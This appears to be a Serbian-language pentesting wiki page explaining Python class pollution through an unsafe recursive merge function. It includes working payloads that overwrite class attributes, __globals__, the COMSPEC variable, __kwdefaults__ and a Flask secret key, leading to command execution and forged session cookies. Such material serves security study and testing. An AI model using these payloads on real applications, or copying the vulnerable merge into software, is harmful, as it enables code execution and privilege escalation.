# Zagađenje Klasa (Pythonovo Zagađenje Prototipa)

{{#include ../../banners/hacktricks-training.md}}

## Osnovni Primer

Proverite kako je moguće zagađivati klase objekata sa stringovima:
```python
class Company: pass
class Developer(Company): pass
class Entity(Developer): pass

c = Company()
d = Developer()
e = Entity()

print(c) #<__main__.Company object at 0x1043a72b0>
print(d) #<__main__.Developer object at 0x1041d2b80>
print(e) #<__main__.Entity object at 0x1041d2730>

e.__class__.__qualname__ = 'Polluted_Entity'

print(e) #<__main__.Polluted_Entity object at 0x1041d2730>

e.__class__.__base__.__qualname__ = 'Polluted_Developer'
e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'

print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
```
## Osnovni Primer Ranljivosti
```python
# Initial state
class Employee: pass
emp = Employee()
print(vars(emp)) #{}

# Vulenrable function
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)


USER_INPUT = {
"name":"Ahemd",
"age": 23,
"manager":{
"name":"Sarah"
}
}

merge(USER_INPUT, emp)
print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
```
## Primeri gadgeta

<details>

<summary>Postavljanje podrazumevane vrednosti svojstva klase na RCE (subprocess)</summary>
```python
from os import popen
class Employee: pass # Creating an empty class
class HR(Employee): pass # Class inherits from Employee class
class Recruiter(HR): pass # Class inherits from HR class

class SystemAdmin(Employee): # Class inherits from Employee class
def execute_command(self):
command = self.custom_command if hasattr(self, 'custom_command') else 'echo Hello there'
return f'[!] Executing: "{command}", output: "{popen(command).read().strip()}"'

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

USER_INPUT = {
"__class__":{
"__base__":{
"__base__":{
"custom_command": "whoami"
}
}
}
}

recruiter_emp = Recruiter()
system_admin_emp = SystemAdmin()

print(system_admin_emp.execute_command())
#> [!] Executing: "echo Hello there", output: "Hello there"

# Create default value for Employee.custom_command
merge(USER_INPUT, recruiter_emp)

print(system_admin_emp.execute_command())
#> [!] Executing: "whoami", output: "abdulrah33m"
```
</details>

<details>

<summary>Zagađivanje drugih klasa i globalnih varijabli kroz <code>globals</code></summary>
```python
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class User:
def __init__(self):
pass

class NotAccessibleClass: pass

not_accessible_variable = 'Hello'

merge({'__class__':{'__init__':{'__globals__':{'not_accessible_variable':'Polluted variable','NotAccessibleClass':{'__qualname__':'PollutedClass'}}}}}, User())

print(not_accessible_variable) #> Polluted variable
print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
```
</details>

<details>

<summary>Izvršenje proizvoljnih podprocesa</summary>
```python
import subprocess, json

class Employee:
def __init__(self):
pass

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

# Overwrite env var "COMSPEC" to execute a calc
USER_INPUT = json.loads('{"__init__":{"__globals__":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"}}}}}}') # attacker-controlled value

merge(USER_INPUT, Employee())

subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
```
</details>

<details>

<summary>Prepisivanje <strong><code>__kwdefaults__</code></strong></summary>

**`__kwdefaults__`** je posebna atribut svih funkcija, zasnovan na Python [dokumentaciji](https://docs.python.org/3/library/inspect.html), to je “mapiranje bilo kojih podrazumevanih vrednosti za **samo-ključeve** parametre”. Zagađivanje ovog atributa nam omogućava da kontrolišemo podrazumevane vrednosti parametara samo za ključeve funkcije, to su parametri funkcije koji dolaze posle \* ili \*args.
```python
from os import system
import json

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class Employee:
def __init__(self):
pass

def execute(*, command='whoami'):
print(f'Executing {command}')
system(command)

print(execute.__kwdefaults__) #> {'command': 'whoami'}
execute() #> Executing whoami
#> user

emp_info = json.loads('{"__class__":{"__init__":{"__globals__":{"execute":{"__kwdefaults__":{"command":"echo Polluted"}}}}}}') # attacker-controlled value
merge(emp_info, Employee())

print(execute.__kwdefaults__) #> {'command': 'echo Polluted'}
execute() #> Executing echo Polluted
#> Polluted
```
</details>

<details>

<summary>Prepisivanje Flask tajne kroz fajlove</summary>

Dakle, ako možete da izvršite klasu zagađenja nad objektom definisanim u glavnom python fajlu veba, ali **čija je klasa definisana u drugom fajlu** od glavnog. Zato što da biste pristupili \_\_globals\_\_ u prethodnim payload-ima, morate pristupiti klasi objekta ili metodama klase, moći ćete da **pristupite globalnim varijablama u tom fajlu, ali ne i u glavnom**. \
Stoga, **nećete moći da pristupite globalnom objektu Flask aplikacije** koji je definisao **tajni ključ** na glavnoj stranici:
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
U ovom scenariju vam je potreban uređaj da pretražujete fajlove kako biste došli do glavnog da **pristupite globalnom objektu `app.secret_key`** kako biste promenili Flask tajni ključ i mogli da [**povećate privilegije** znajući ovaj ključ](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

Payload poput ovog [iz ovog izveštaja](https://ctftime.org/writeup/36082):
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Koristite ovaj payload da **promenite `app.secret_key`** (ime u vašoj aplikaciji može biti drugačije) kako biste mogli da potpisujete nove i privilegovanije flask kolačiće.

</details>

Proverite i sledeću stranicu za više read only gadgeta:

{{#ref}}
python-internal-read-gadgets.md
{{#endref}}

## Reference

- [https://blog.abdulrah33m.com/prototype-pollution-in-python/](https://blog.abdulrah33m.com/prototype-pollution-in-python/)

{{#include ../../banners/hacktricks-training.md}}
